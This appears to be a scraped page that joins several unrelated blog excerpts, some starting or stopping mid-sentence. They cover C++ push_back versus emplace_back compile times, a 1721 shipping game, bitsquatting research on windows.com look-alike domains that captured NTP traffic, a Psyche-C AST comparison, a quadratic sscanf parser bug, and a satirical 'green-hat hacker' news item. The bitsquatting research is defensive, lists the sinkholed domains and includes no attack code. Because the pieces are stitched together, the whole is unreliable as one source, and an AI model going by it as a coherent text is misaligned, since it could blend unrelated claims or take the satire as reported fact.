<p>See, <code>push_back</code> knows that it expects a <code>string&amp;&amp;</code>, and so it knows to call the
non-explicit constructor <code>string(const char *)</code> on the caller’s side. The same
constructor is called in each case, and the temporary <code>string</code> is passed to
the same overload of <code>push_back</code> in each case. <code>emplace_back</code>, on the other hand,
is a dumb perfect-forwarding template: it doesn’t know that the relevant constructor
overload will end up being <code>string(const char *)</code> in each case. So it takes
an lvalue reference to the specific <em>array type</em> being passed by the caller.
Perfect-forwarding has no special cases for <code>const char *</code>!</p>

<p>If we change <code>vector&lt;string&gt;</code> to <code>vector&lt;const char *&gt;</code>, the compile-time-performance
gap widens: now it’s 0.7s for <code>push</code>, 3.8s for <code>emplace</code>. This is because we’ve cut
out some of the work that was common to both versions (constructing <code>std::string</code> objects)
without affecting the source of the gap (that one version instantiates a
thousand copies of <code>emplace_back</code> and the other doesn’t). Amdahl’s Law in action!</p>

<p>My conclusions:</p>

<blockquote>
  <p>Use <code>push_back</code> by default.</p>
</blockquote>

<blockquote>
  <p>Use <code>emplace_back</code> where it is semantically significant to your algorithm
(such as when the element type’s move-constructor is absent or has been
benchmarked as expensive).</p>
</blockquote>

<blockquote>
  <p>Avoid mixing string literals and perfect-forwarding templates,
especially in repetitive machine-generated code.</p>
</blockquote>

                exchange for a share of the revenue.</p>
            <p>Unfortunately, this being 1721, a significant fraction of shipments
                end up on the sea floor, or stolen by pirates, or gets lost to
                corrupt locals.</p>
            <p>You will be presented with a few shipments to finance, of varying
                value, ordered from low to high. They all have the same return
                relative to financing cost – your job is just to pick the most
                attractively sized suggestion.</p>
            <p>All proposed shipments have one thing in common: they will need to
                pass through a specific strait. This is critical information for
                your decision: different straits have different probabilities of
                losing the goods.</p>

            <p>You will have to consider three straits. Their true probability of
                success is unknown (and varies whenever you restart the game) but
                you get an estimation for each as a hint.</p>
            <ul>
                <li><strong>Bering</strong>: Very dangerous. Probability of success
                    is around 50&nbsp;%. Shipments through Bering strait
                    often have a high payoff as a result.</li>
                <li><strong>Malacca</strong>: Somewhat unsafe. Probability of
                    success is estimated to be between 60&nbsp;% and 80&nbsp;%.</li>
                <li><strong>Gibraltar</strong>: Very safe. Probability of success
                    unknown, but it seems to be over 90&nbsp;%, maybe even as high
                    as 100&nbsp;%. These shipments have relatively low payoff.</li>
            </ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://remyhax.xyz/image/dns.jpg"></figure><p>Earlier this month, I came back around to seriously considering an attempt at <a href="http://dinaburg.org/bitsquatting.html">bitsquatting</a>. While the prior link goes into great depth on the topic, I will attempt to give a <em>very</em> high level overview here:</p><p>If this sort of thing interests you: I tend to do stuff like this weekly. Give me a follow <a href="https://twitter.com/_mattata">@_mattata</a></p><p>When you try to access a site by it’s domain, that domain is stored in the memory of your computer, device, whatever… in a structure that looks something like this.</p><table><thead><tr><th>01110111</th><th>01101001</th><th>01101110</th><th>01100100</th><th>01101111</th><th>01110111</th><th>01110011</th></tr></thead><tbody><tr><td>w</td><td>i</td><td>n</td><td>d</td><td>o</td><td>w</td><td>s</td></tr></tbody></table><p>Now let’s say that the computer is running too hot, a solar flare is happening, or a cosmic ray (very real thing) flips a bit on the computer.</p><table><thead><tr><th>01110111</th><th>01101000</th><th>01101110</th><th>01100100</th><th>01101111</th><th>01110111</th><th>01110011</th></tr></thead><tbody><tr><td>w</td><td><strong>h</strong></td><td>n</td><td>d</td><td>o</td><td>w</td><td>s</td></tr></tbody></table><p>Oh no! Now the value stored in memory is w<strong>h</strong>ndows.com instead of windows.com! When the time comes to make a connection to that domain, what happens?</p><blockquote><p>nslookup whndows.com</p></blockquote><blockquote><p>*** can’t find whndows.com: Non-existent domain</p></blockquote><p>The domain doesn’t resolve to an IP!</p><hr><p>In fact, out of the 32 valid domain names that are 1-bitflip away from windows.com 14 were available for purchase! This is a rather odd occurance as usually these are bought up by a company like Microsoft to prevent their use for phishing attempts. So I bought them. All of them. For ~$126.</p><p>(<em>If you’re a verifiably responsible party, I’m more than happy to transfer ownership of the domains. Otherwise, I’ll just hold on to them and continue to sinkhole.</em>)</p><blockquote><p>windnws.com
windo7s.com
windkws.com
windmws.com
winlows.com
windgws.com
wildows.com
wintows.com
wijdows.com
wiodows.com
wifdows.com
whndows.com
wkndows.com
wmndows.com</p></blockquote><p>Now we need to point these domains somewhere. So I rent a VPS and configure IPv4/IPv6, and create wildcard DNS entries to point to them.</p><p>Wildcard DNS works so that if I create a record saying that whndows.com points to 123.123.123.123 and someone requests abs.xyz.whndows.com, they will still get the same 123.123.123.123 DNS record as a reply. Due to the nature of this research dealing with bits being flipped, this allows me to capture any DNS lookup for a subdomain of windows.com where multiple bits have flipped.</p><p>Once we have DNS configured, we use <a href="https://www.wireshark.org/docs/man-pages/tshark.html">tshark</a> to perform a packet capture on the public interface of our VPS and wait for something interesting to happen.</p><p>Below is a short snippet of some interesting things that can be shared without uniquely indentifying any users.</p><p>Usage of <strong><a href="https://greynoise.io/tech">GreyNoise.io</a></strong> was key in helping to differentiate between opportunistic scanning and actual bitflip scenarios. Great product!</p><h2 id="ntp-udp-port-123-timewindowscom">NTP UDP port 123 time.windows.com</h2><p>UDP packets destined for port 123 attempting to set their computer clock using the Network Time Protocol (NTP).
time.windows.com is the default NTP server configured for all Windows machines and they check for the time regularly. If they don’t succeed in getting the time, they try again, and again, and again.</p><p>In total, over the course of 14 days, my server recieved <strong>199,180 NTP Client connections from 626 unique IP addresses.</strong></p><p>The NTP client for windows OS has no inherent verification of authenticity, so there is nothing stopping a malicious person from telling all these computers that it’s after <a href="https://en.wikipedia.org/wiki/Year_2038_problem">03:14:07 on Tuesday, 19 January 2038</a> and wreaking unknown havoc as the memory storing the signed 32-bit integer for time overflows.</p><p>As it turns out though, for ~30% of these computers doing that would make little to no difference at all to those users because their clock is already <em>broken</em>.</p><p>Using the tshark filter “ntp.xmt” we can extract the Transmit Timestamp, which is the time that the computer thinks it is when it asks to update the time.</p><blockquote><p>tshark -r capture.pcap -T fields -e ntp.xmt -2 -R ntp.xmt | sort -u</p></blockquote><pre><code>Sep 28, 1984 19:41:12.638290998 EDT

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      

<p>Given that the Psyche-C compiler frontend is being renewed, I decided to start a blog about the project. This is my first post.</p>

<p>Without further ado, consider this C program (assume that its name is <code>test.c</code>):</p>

<div><div><pre><code><span>int</span> <span>v</span><span>,</span> <span>f</span><span>(</span><span>int</span> <span>d</span><span>);</span>

<span>int</span> <span>f</span><span>(</span><span>int</span> <span>p</span><span>)</span>
<span>{</span>
    <span>if</span> <span>(</span><span>p</span> <span>==</span> <span>v</span><span>)</span>
        <span>return</span><span>(</span><span>p</span> <span>-</span> <span>1</span><span>);</span>
    <span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>To produce and dump an AST with Psyche-C, we invoke the <em>cnippet</em> driver adaptor with command line option <code>--C-dump-AST</code>. The output is as follows:</p>

<p><img width="609" alt="Screen Shot 2021-03-03 at 20 56 16" src="https://user-images.githubusercontent.com/2905588/109888794-e8d75f00-7c62-11eb-98bc-c62247df0c3e.png"></p>

<p>Now, I’ll briefly correlate the above AST with the one produced by <a href="https://clang.llvm.org/">Clang</a> for the same <code>test.c</code> program. Let’s take a look at it:</p>

<p><img width="789" alt="Screen Shot 2021-03-03 at 21 03 44" src="https://user-images.githubusercontent.com/2905588/109889407-17096e80-7c64-11eb-9ecd-b0bd56af902e.png"></p>

<p>Apart from the colors and extra decoration, what are the main differences between the two?</p>

<ul>
  <li><em>It’s that Psyche-C’s AST is a bit closer to the grammar of C.</em> For instance, you can’t see <em>declarator</em>s in Clang’s AST, they are absorbed by their containing <em>declaration</em>s.</li>
</ul>

<p>Whether or not this characteristic is good or bad will depend on a given application. For the purpose of static analysis implementation, I consider the refined syntax insights of Psyche-C’s AST an advantage.</p>

<p>I’m not saying that every <em>node</em> in a AST should correspond to a <em>terminal</em> of the grammar. If so, we’d end up with a rather <strong>concrete</strong> syntax (or parse) tree, instead of an <strong>abstract</strong> syntax tree. A comprehensible AST will contain just enough of a language’s meaning embedded into it. (The AST produced by the <a href="https://github.com/ltcmelo/psychec/tree/original">old parser of Psyche-C</a>, e.g., was too grammar-oriented.)</p>

<p>Consider this snippet from our <code>test.c</code> program:</p>



<p>In Clang’s AST, it’s represented through a <code>VarDecl</code> and a <code>FunctionDecl</code>; both these nodes <a href="https://clang.llvm.org/doxygen/classclang_1_1DeclaratorDecl.html">inherit from</a> <code>DeclaratorDecl</code> (i.e., a <em>declaration</em> with a <em>declarator</em>). But, in pedantic terms, that representation isn’t quite correct, given that a single <em>declaration</em> — one starting at <code>int</code> and ending at <code>;</code> — exists in that snippet.</p>

<p>In Psyche-C, I opted for a more rigorous representation in the AST:</p>

<ul>
  <li>A <code>VariableAndOrFunctionDeclaration</code> is created (just like Clang, this node <a href="https://ltcmelo.github.io/psychec/api-docs/html/classpsy_1_1_c_1_1_variable_and_or_function_declaration_syntax.html">inherits from</a> a <code>DeclaratorDeclaration</code>) with two child nodes: an <code>IdentifierDeclarator</code>, designating object of type <code>int</code>, and a <code>FunctionDeclarator</code>, designating a function whose return type is <code>int</code>. This choice makes the AST rewritable with accuracy as well.</li>
</ul>

<p>In general, the design “spirit” of Psyche-C’s AST is more aligned with that of <a href="https://github.com/dotnet/roslyn">Roslyn</a>, the .NET compiler platform. Although, because Psyche-C is a frontend for C, its AST will, of course, resembles that of Clang.</p>

<p>To wrap up, I’ll leave a C# version of <code>test.c</code> (well, <code>test.cs</code>), together with its AST.</p>

<h2>It Can Happen to You</h2>
<p>A few days ago, a <a href="https://nee.lv/2021/02/28/How-I-cut-GTA-Online-loading-times-by-70/">fascinating article</a>
about Grand Theft Auto Online
made the rounds of the tech news ecosystem.</p>
<p>I'd encourage you to read the whole thing, but in short,
GTA Online had <a href="https://accidentallyquadratic.tumblr.com/">accidentally quadratic</a>
performance when parsing a large JSON blob
(due to repeated calls to <code>strlen</code>);
fixing this improved loading time by almost 70%.</p>
<p>This sparked a <a href="https://news.ycombinator.com/item?id=26296339">great deal</a> of discussion:
Was this C's fault?
Perhaps <a href="https://twitter.com/Jonathan_Blow/status/1366452792563359744">"web shit"</a>?
<a href="https://twitter.com/fasterthanlime/status/1366187333507293184">Capitalism and incentives</a>?</p>
<p>Still, folks in the comments section generally agreed:
<em>they</em> wouldn't write anything that silly.</p>
<p>(<em>do you feel the foreshadowing?</em>)</p>
<hr>
<p>One of my side projects is a high-performance 3D viewer named <a href="https://www.mattkeeter.com/projects/erizo">Erizo</a>.</p>
<p><img src="https://www.mattkeeter.com/blog/2021-03-01-happen/porsche.png" alt="Porsche"></p>
<p>Thanks to a lot of careful programming, it will open a 97 MB binary STL
file in about 165 milliseconds flat, on a <em>2013</em> Macbook Pro.
This is <strong>blinding</strong> fast.</p>
<p>In the interest of compatibility, I wrote a small parser for
<a href="https://en.wikipedia.org/wiki/STL_(file_format)#ASCII_STL">ASCII STLs</a> as well.</p>
<p>ASCII STLs are a poorly-specified plain-text format that looks like this:</p>
<pre><code>solid cube_corner
          facet normal 0.0 -1.0 0.0
            outer loop
              vertex 0.0 0.0 0.0
              vertex 1.0 0.0 0.0
              vertex 0.0 0.0 1.0
            endloop
          endfacet
          facet normal 0.0 0.0 -1.0
            outer loop
              vertex 0.0 0.0 0.0
              vertex 0.0 1.0 0.0
              vertex 1.0 0.0 0.0
            endloop
          endfacet
          ...
endsolid
</code></pre>
<p>I wrote an extremely <a href="https://en.wikipedia.org/wiki/Robustness_principle">robust</a>
parser, described in a comment as</p>
<pre><code>/*  The most liberal ASCII STL parser:  Ignore everything except
 *  the word 'vertex', then read three floats after each one. */
</code></pre>
<p>Loading ASCII STLs always seemed a little slow, but I assumed
that's what you get for using an inefficient textual format.</p>
<p>(<em>foreshadowing intensifies</em>)</p>
<hr>
<p>Over the course of a few days, several things happened:</p>
<ul>
<li>I revisited Erizo for the first time in a few years to fix a <a href="https://github.com/mkeeter/erizo/commit/d4683f94a4aa0b674bdde0fa53fb6f92d6e1979c">focus issue on macOS</a></li>
<li>The GTA Online article was published</li>
<li>In a follow-up discussion, I learned that
<a href="https://news.ycombinator.com/item?id=26302744">parsing could be quadratic due to repeated calls to <code>sscanf</code></a></li>
<li>I noticed that ASCII STL loading was <em>really quite</em> slow.</li>
</ul>
<p>Here's the timestamped logs (in seconds), loading a 1.5 MB ASCII STL:</p>
<pre><code>[erizo] (0.000000) main.c:10      | Startup!
[erizo] (0.162895) window.c:91    | Created window
[erizo] (0.162900) window.c:95    | Made context current

[erizo] (1.819887) loader.c:279   | Loader thread done
[erizo] (1.821291) instance.c:32  | Showed window
</code></pre>
<p>From startup to showing the window, it took over 1.8 seconds!</p>
<p>Looking at the ASCII parser with fresh eyes, the cause was glaringly obvious:</p>
<pre><code>    /*  The most liberal ASCII STL parser:  Ignore everything except
     *  the word 'vertex', then read three floats after each one. */
    const char VERTEX_STR[] = "vertex ";
    while (1) {
        data = strstr(data, VERTEX_STR);
        if (!data) {
            break;
        }

        /* Skip to the first character after 'vertex' */
        data += strlen(VERTEX_STR);

        for (unsigned i=0; i &lt; 3; ++i) {
            SKIP_WHILE(isspace);
            float f;
            const int r = sscanf(data, "%f", &amp;f);
            ABORT_IF(r == 0 || r == EOF, "Failed to parse float");
            if (buf_size == buf_count) {
                buf_size *= 2;
                buffer = (float*)realloc(buffer, buf_size * sizeof(float));
            }
            buffer[buf_count++] = f;

            SKIP_WHILE(!isspace);
        }
    }
</code></pre>
<p>You may notice <code>sscanf</code>, happily sitting there, reading a single float off
the front of the data stream and <strong>checking the length of the whole string each time</strong>.</p>
<p>Yes, I had made the exact same mistake as the programmers working on GTA Online:
I had an accidentally quadratic parser!</p>
<p>Replacing the <code>sscanf</code> call with <code>strtof</code> improved startup by nearly a factor of
10: from 1.8 seconds to 199 milliseconds.</p>
<pre><code>[erizo] (0.000000) main.c:10      | Startup!
[erizo] (0.178082) window.c:91    | Created window
[erizo] (0.178086) window.c:95    | Made context current

</code></pre>
<p>This is back down in the noise of
"how long does the OS take to give us an OpenGL context",
which is a great place for a high-performance tool.</p>
<hr>
<p>As someone that has been programming for many years,
this was a perfectly-timed reminder that there are <em>always</em> pitfalls out there.
The <a href="https://en.cppreference.com/mwiki/index.php?title=cpp/io/c/fscanf&amp;oldid=125683">documentation for <code>sscanf</code></a>
does not include a time complexity,
so this is particularly tricky <a href="https://en.wiktionary.org/wiki/footgun">footgun</a>,
and I'm sure it's not the only one lurking in the darkness.</p>
<p>You may not get such a perfectly-timed reminder, but it's worth remembering –
next time you read a fascinating story about bad programming –
that it <em>can</em> happen to you!</p>
<p>(Obviously, the moral of the story is to not use <code>sscanf</code> to repeatedly
parse single tokens off the front of a string; I'm sure you'll do <em>fine</em>
if you can just avoid <strong>that</strong>)</p>

<p>A hacker of unknown origins hacked into servers of Complify, a rapidly growing VC-funded startup. When Complify's security specialists noticed the breach, it was too late. However, unexpectedly, the hacker's actions did not seem to have been destructive in nature.</p><p>Apparently, the hacker rewrote complex backend architecture with a simple, single-node PostgreSQL instance and a bunch of cron jobs. This made the whole cluster of orchestrated containerized systems obsolete in one night. As a result, the CEO and the board of directors had no other choice but to let go 583 tech employees (nearly 40% of the workforce), as they now have literally nothing to do.</p><p>Alarmed, other startups in the industry are hiring more security specialists in order to reduce the risk of so-called <strong>"green-hat hacker"</strong> attacks.</p>
